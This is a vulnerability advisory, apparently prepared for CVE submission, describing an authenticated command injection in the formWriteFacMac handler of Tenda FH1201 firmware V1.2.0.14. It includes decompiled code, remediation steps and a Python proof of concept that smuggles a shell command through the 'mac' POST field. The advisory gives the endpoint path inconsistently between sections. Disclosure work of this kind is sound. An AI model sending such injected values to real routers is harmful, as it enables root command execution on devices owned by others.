# Tenda FH1201 V1.2.0.14 was discovered to contain a command injection vulnerability in formWriteFacMac

## Overview

- Vendor: Tenda
- Product: FH1201
- Version: V1.2.0.14(408)
- Component: formWriteFacMac handler
- Vulnerability Class: CWE-78 command injection
- Manufacturer: https://www.tendacn.com/

## Affected version

- Product: Tenda FH1201
- Firmware: V1.2.0.14(408)
- Package: `US_FH1201V1.0BR_V1.2.0.14(408)_EN_TD.zip`.
- `bin/httpd`:.
- Architecture: MIPS big-endian, uClibc, stripped Realtek httpd.

## Vulnerability details

`formWriteFacMac` reads the POST parameter `mac` and passes it directly to
`doSystemCmd("cfm mac %s", mac)` without MAC-format or character validation.
The decompiled function is only:

```c
Var = websGetVar(a1, "mac", "00:01:02:11:22:33");
doSystemCmd("cfm mac %s", Var);
```

The handler is referenced from `formDefineTendDa`, so the endpoint is
`POST /goform/WriteFacMac`. `mac` can contain `;`, backticks, or `$()`, which
the shell interprets.

Authentication: `R7WebsSecurityHandler` pre-auth paths are `/public/`,
`/lang/`, `/images/`, `/goform/BulletinBoard`, and `/goform/ate`; `WriteFacMac`
is not exempt, so this is an authenticated-admin issue. The security handler
uses a login cookie with no per-request CSRF token, so admin-CSRF is plausible.

## PoC

```python
import requests

url = "http://<router>/goform/WriteFacMac"
cookies = {"password": "<admin-cookie>"}
r = requests.post(
    url,
    data={"mac": "00:11:22:33:44:55; id > /tmp/fh1201_facmac"},
    cookies=cookies,
    timeout=5,
)
print(r.status_code, r.text[:200])
```

## Reproduction and terminal evidence

Static evidence; the FH1201 image has not been fully rehosted. The handler and
registration are from the unmodified `bin/httpd`:

```
formWriteFacMac 0x44bb64:
  Var = websGetVar(a1, "mac", "00:01:02:11:22:33");
  doSystemCmd("cfm mac %s", Var);

formDefineTendDa -> xref to formWriteFacMac at 0x43b750
R7WebsSecurityHandler pre-auth list: /public/, /lang/, /images/,
  /goform/BulletinBoard, /goform/ate (WriteFacMac not listed)
```

Full decompilation is in the parent project's
`scratch/tenda-fh1201-v1.2.0.14/ida/` directory.

## Impact

Authenticated admin (or CSRF) root command execution.

## Remediation

- Validate `mac` as six octets before use.
- Use `execve`/argv for `cfm`; do not pass the value through a shell.
- Add CSRF tokens to configuration handlers.

## Known CVE relation

**CVE candidate type: new affected model (FH1201) for the public formWriteFacMac pattern — candidate new CVE.**

- The `formWriteFacMac`/`cfm mac` pattern is public for other Tenda models
  (AC10U/AC6 research sets). FH1201 V1.2.0.14(408) is a new affected model
  unless the vendor/CNA has already grouped it. NVD has no FH1201
  `formWriteFacMac` entry at the time of writing.

## Status and disclosure

Static confirmation (handler and registration unchanged). Dynamic pending.
Candidate new CVE — new affected model (FH1201) for the public formWriteFacMac pattern; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
Tenda

### Product
FH1201

### Version or Commit
V1.2.0.14(408)

### Vulnerability Class
CWE-78 command injection

### CVE_candidate_type
new affected model (FH1201) for the public formWriteFacMac pattern — candidate new CVE

### Description
formWriteFacMac passes the mac POST parameter to doSystemCmd("cfm mac %s") without validation.

### Affected_component
formWriteFacMac handler

### Attack_vector
Authenticated POST to /goform/formWriteFacMac with a crafted mac.

### Product_version
FH1201 V1.2.0.14(408)

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/FH1201_V1.2.0.14/report-1.md
```
